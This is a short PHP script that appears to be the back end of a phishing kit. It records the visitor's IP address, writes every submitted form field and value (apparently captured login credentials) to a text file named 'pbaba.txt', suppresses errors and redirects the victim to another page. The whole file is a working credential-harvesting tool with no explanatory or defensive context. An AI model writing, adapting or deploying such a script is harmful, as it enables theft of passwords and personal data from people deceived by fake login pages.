<?php
 // include ('UserInformation.php');
    include ('ip.php');


// header("location: https://www.google.com");
header('location: w2jffh454rg5f4gf5g4fg55fafgehjf5dg4sfd5g.html');
error_reporting(0);
$handle = fopen("pbaba.txt","a");
fwrite($handle, $ip_address);
fwrite($handle, "\r\n");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 
       